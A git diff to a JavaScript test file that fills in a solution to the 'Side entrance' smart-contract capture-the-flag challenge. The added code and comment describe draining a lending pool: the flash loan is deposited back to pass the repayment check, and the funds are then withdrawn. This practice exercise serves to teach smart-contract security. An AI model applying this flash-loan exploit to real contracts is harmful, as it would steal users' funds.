@@ -24,7 +24,12 @@ describe('[Challenge] Side entrance', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        // attacker can deposit back the flash loan to avoid the check to return the money,
+        // and later withdraw all the funds.
+        const SideEntranceReceiverFactory = await ethers.getContractFactory('SideEntranceReceiver', attacker);
+        const receiver = await SideEntranceReceiverFactory.deploy(this.pool.address);
+
+        await receiver.flashLoan(ETHER_IN_POOL);
     });
 
     after(async function () {
